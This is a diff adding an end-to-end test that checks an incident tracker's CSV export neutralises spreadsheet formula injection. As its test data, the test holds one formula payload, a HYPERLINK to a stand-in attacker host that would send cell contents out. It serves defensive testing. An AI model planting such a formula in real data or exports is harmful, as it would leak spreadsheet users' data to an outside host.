@@ -283,6 +283,36 @@ describe('Incidents (e2e)', () => {
     });
   });
 
+  describe('GET /incidents/export.csv', () => {
+    // F9.4 — CSV injection (CWE-1236). The unit spec covers the serializer;
+    // this is the wiring proof, that a title typed by a user really does
+    // reach the export through it rather than around it.
+    it('neutralizes a formula-shaped title so the export cannot execute in a spreadsheet', async () => {
+      const token = await loginAs(app, orgAMember, 'password123');
+      await prisma.seedIncident({
+        orgId: 'org-a',
+        projectId: projectA.id,
+        typeId: plumbingType.id,
+        ownerId: orgAMember.id,
+        title: '=HYPERLINK("https://attacker.test/?d="&A1,"Ver informe")',
+        priority: 'high',
+        status: 'open',
+      });
+
+      const res = await request(app.getHttpServer())
+        .get('/incidents/export.csv')
+        .set('Authorization', `Bearer ${token}`)
+        .expect(200);
+
+      const csv = res.text;
+      expect(csv).toContain(`'=HYPERLINK(`);
+      // The cell no longer *starts* with `=`, which is the whole condition a
+      // spreadsheet uses to decide it is looking at a formula.
+      expect(csv).not.toContain(',=HYPERLINK(');
+      expect(csv).not.toContain('"=HYPERLINK(');
+    });
+  });
+
   describe('GET /incidents/:id', () => {
     it('returns 404 for an incident belonging to another organization', async () => {
       const token = await loginAs(app, orgAMember, 'password123');
